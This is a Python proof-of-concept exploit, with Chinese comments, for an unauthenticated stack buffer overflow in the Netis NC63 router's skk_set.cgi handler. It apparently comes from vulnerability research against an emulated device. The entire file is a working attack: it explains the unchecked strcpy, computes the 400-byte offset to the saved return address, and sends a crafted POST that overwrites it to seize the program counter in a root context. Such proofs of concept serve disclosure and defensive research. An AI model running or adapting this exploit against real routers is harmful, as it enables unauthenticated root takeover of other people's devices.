#!/usr/bin/env python3
# FIND-0003 PoC — Netis NC63 V3.0.0.3327 skk_set 解析器认证前栈溢出 (PC 控制)
# CWE-121 / 未认证 / root 上下文 / POST body 输入
#
# 原理: netis.cgi 通用 MIB 解析器 FUN_0040f7f4 case 6 (inet_aton 分支)
#   strcpy(256B 栈缓冲 $fp+0x3c, 攻击者参数值) —— 无长度检查
#   saved $ra 距缓冲起点 400 字节; 载荷长 404 时 NUL 终止符恰好落在无害区
#
# 用法: python3 poc_find0003_pc.py [host] [port]
# 预期: VM 串口日志出现  epc = 44444444  (指令指针被 "DDDD" 接管)

import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 19080

payload = b"A" * 392      # 填充至 saved $s0
payload += b"BBBB"        # saved $s0
payload += b"CCCC"        # saved $fp
payload += b"DDDD"        # saved $ra  <- PC 控制标记
assert len(payload) == 404

body = b"lan_ip_set=mod&lanIpAddr=" + payload
req = (
    b"POST /cgi-bin/skk_set.cgi HTTP/1.0\r\n"
    b"Host: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"\r\n" + body
)

s = socket.create_connection((HOST, PORT), timeout=20)
s.sendall(req)
try:
    r = s.recv(512)
    print("response:", r[:120])
except socket.timeout:
    print("response: <timeout> (CGI 可能已崩溃)")
s.close()
print("payload sent:", len(payload), "bytes in lanIpAddr")
